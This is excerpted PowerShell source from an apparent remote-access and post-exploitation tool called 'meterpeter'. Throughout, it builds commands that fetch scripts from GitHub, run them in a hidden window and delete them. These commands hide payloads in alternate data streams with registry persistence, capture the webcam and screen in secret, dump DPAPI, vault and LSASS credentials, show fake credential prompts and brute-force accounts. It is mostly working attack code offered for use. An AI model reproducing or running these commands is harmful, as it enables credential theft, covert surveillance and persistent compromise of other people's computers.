                 ## ORIGINAL: $Command = "echo `"@echo off`"|Out-File `"${LegitImage}\ZoneIdentifier.bat`" -Encoding default -Force;Add-Content ${LegitImage}\ZoneIdentifier.bat `"powershell -WindowStyle hidden -File $Client_name`" -Force;iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/AdsMasquerade.ps1`" -OutFile `"`$Env:TMP\AdsMasquerade.ps1`"|Unblock-File;powershell -file `$Env:TMP\AdsMasquerade.ps1 -ADS `"create`" -streamdata `"${LegitImage}\ZoneIdentifier.bat`" -intextfile `"$Image_name`" -registry `"true`";Remove-Item -Path `"`$Env:TMP\AdsMasquerade.ps1`" -Force";
           ...
           ElseIf($Chosen_Option -iMatch '^(find)$')
           {
              ...
              $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/AdsMasquerade.ps1`" -OutFile `"`$Env:TMP\AdsMasquerade.ps1`"|Unblock-File;powershell -file `$Env:TMP\AdsMasquerade.ps1 -ADS `"enum`" -streamdata `"false`" -StartDir `"$StartDir`";Remove-Item -Path `"`$Env:TMP\AdsMasquerade.ps1`" -Force";
           }
           ElseIf($Chosen_Option -iMatch '^(clean)$')
           {
              ...
              $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/AdsMasquerade.ps1`" -OutFile `"`$Env:TMP\AdsMasquerade.ps1`"|Unblock-File;powershell -file `$Env:TMP\AdsMasquerade.ps1 -ADS `"clear`" -streamdata `"$streamdata`" -intextfile `"$Image_name`";Remove-Item -Path `"`$Env:TMP\AdsMasquerade.ps1`" -Force";
           }
           Else
           {
              $Command = $Null;
      ...
      If($choise -ieq "Camera" -or $choise -ieq "cam")
      {
        ...
        If($Cam_choise -ieq "SnapShot")
        {
           ...
           $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/utils/CommandCam.exe`" -OutFile `"`$Env:TMP\commandcam.exe`";Start-Process -WindowStyle hidden powershell -argumentlist `"cmd /R start /min %tmp%\CommandCam.exe`" -Wait;echo `"  Storage : `$Env:TMP\image.bmp`";Remove-Item `$Env:TMP\CommandCam.exe -Force";
        }
      ...
      If($choise -ieq "Passwords" -or $choise -ieq "pass")
      {
        ...
        If($pass_choise -ieq "Dpapi")
        {
           ...
           $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1`" -OutFile `"`$Env:TMP\Invoke-VaultCmd.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-VaultCmd.ps1`" -action `"DPAPI`" -banner `"false`";Remove-Item -Path `"`$Env:TMP\Invoke-VaultCmd.ps1`" -Force";
        }
        If($pass_choise -ieq "Vault")
        {
           write-host " * Dumping $Remote_Host PasswordVault creds." -ForegroundColor Green
           $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1`" -OutFile `"`$Env:TMP\Invoke-VaultCmd.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-VaultCmd.ps1`" -action `"dump`" -banner `"false`" -secure;Remove-Item -Path `"`$Env:TMP\Invoke-VaultCmd.ps1`" -Force"
        }
        If($pass_choise -ieq "Start")
        {
          ...
          {
             $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/Find-Strings.ps1`" -OutFile `"`$Env:TMP\Find-Strings.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Find-Strings.ps1`" -Path `"$Recursive_search`" -String `"$String`" -strlength `"$MaxLength`" -StopAt `"$StopAt`";Remove-Item -Path `"`$Env:TMP\Find-Strings.ps1`" -Force";
          }
          Else
          {
             $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/Find-Strings.ps1`" -OutFile `"`$Env:TMP\Find-Strings.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Find-Strings.ps1`" -Path `"$Recursive_search`" -String `"$String`" -strlength `"$MaxLength`" -StopAt `"$StopAt`" -verb -limmit `"1`";Remove-Item -Path `"`$Env:TMP\Find-Strings.ps1`" -Force";
          }
        }
      ...
      If($choise -ieq "PhishCred" -or $choise -ieq "Creds")
      {
        ...
        If($cred_choise -ieq "Start")
        {
           ...
           $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/CredsPhish.ps1`" -OutFile `"`$Env:TMP\CredsPhish.ps1`"|Out-Null;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File `$Env:TMP\CredsPhish.ps1 -PhishCreds start`" -Wait;Get-Content -Path `"`$Env:TMP\creds.log`";Remove-Item -Path `"`$Env:TMP\creds.log`" -Force;Remove-Item -Path `"`$Env:TMP\CredsPhish.ps1`" -Force"
        }
      ...
      If($choise -ieq "DumpSAM" -or $choise -ieq "sam")
      {
        ...
        $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/DumpLsass.ps1`" -OutFile `"`$Env:TMP\DumpLsass.ps1`"|Unblock-File;powershell -File `$Env:TMP\DumpLsass.ps1;Start-Sleep -Seconds 1;Remove-Item -Path `"`$Env:TMP\DumpLsass.ps1`" -Force"
      }
      If($choise -ieq "BruteAcc")
      {
         ...
         If($Brute_choise -ieq "Start")
         {
            ...
            #Run command
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/modules/CredsPhish.ps1`" -OutFile `"`$Env:TMP\CredsPhish.ps1`";powershell -W 1 -File `$Env:TMP\CredsPhish.ps1 -PhishCreds Brute -Dicionary `$Env:TMP\passw.txt -UserAccount $UserAccountName;Remove-Item -Path `$Env:TMP\CredsPhish.ps1 -Force"
         }
    ...
    If($Command -ieq "Download")
    {
        ...
        write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                     ------------------";
        write-host "   Start     Download from rhost to RHOST    UserLand";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
    ...
    If($Command -ieq "Upload")
    {
        ...
        write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                     ------------------";
        write-host "   Start     Upload from RHOST to rhost      UserLand";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
    ...
    If($Command -ieq "Screenshot")
    {
        ...
        If($choise_two -ieq "SpyScreen")
        {
           ...
           If($Captures -gt 3 -or $Inbetween -gt 5)
           {
              ...
              $Command = "iwr -Uri https://raw.githubusercontent.com/indoushka/redpill/main/bin/Screenshot.ps1 -OutFile `$Env:TMP\Screenshot.ps1|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File $Env:TMP\Screenshot.ps1 -Screenshot $Captures -Delay $Inbetween`""           
           }
           Else
           {
              #Run command
              $Command = "iwr -Uri https://raw.githubusercontent.com/indoushka/redpill/main/bin/Screenshot.ps1 -OutFile `$Env:TMP\Screenshot.ps1|Out-Null;powershell -File `"`$Env:TMP\Screenshot.ps1`" -Screenshot $Captures -Delay $Inbetween"
           }
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "clear")
        {
    ...
    If($Command -ieq "Exit")
    {
      ...
      write-host "      * GitHub: https://github.com/indoushka/meterpeter *`n" -ForegroundColor DarkYellow
